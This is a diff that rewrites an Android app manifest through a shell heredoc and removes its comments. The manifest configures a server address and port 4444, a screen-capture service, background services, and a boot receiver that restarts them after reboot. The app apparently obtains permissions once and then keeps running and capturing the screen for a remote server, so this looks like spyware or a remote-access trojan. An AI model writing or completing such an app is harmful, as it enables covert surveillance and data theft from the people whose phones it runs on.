@@ -1,3 +1,4 @@
+cat > /workspaces/Ohhh-hymn/app/src/main/AndroidManifest.xml <<'EOF'
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android">
 
@@ -24,15 +25,9 @@
         android:supportsRtl="true"
         android:theme="@style/Theme.AppCompat.Light.NoActionBar">
 
-        <!-- Server connection info -->
-        <meta-data
-            android:name="SERVER_IP"
-            android:value="192.168.43.27" />
-        <meta-data
-            android:name="SERVER_PORT"
-            android:value="4444" />
+        <meta-data android:name="SERVER_IP" android:value="192.168.43.27" />
+        <meta-data android:name="SERVER_PORT" android:value="4444" />
 
-        <!-- Main visible screen (first-time permission grant) -->
         <activity
             android:name=".MainActivity"
             android:exported="true"
@@ -45,7 +40,6 @@
             </intent-filter>
         </activity>
 
-        <!-- Foreground and background services -->
         <service
             android:name=".ScreenCaptureService"
             android:enabled="true"
@@ -87,7 +81,6 @@
             android:enabled="true"
             android:exported="false" />
 
-        <!-- Receiver to restart services after reboot -->
         <receiver
             android:name=".BootReceiver"
             android:enabled="true"
@@ -98,3 +91,4 @@
         </receiver>
     </application>
 </manifest>
+EOF
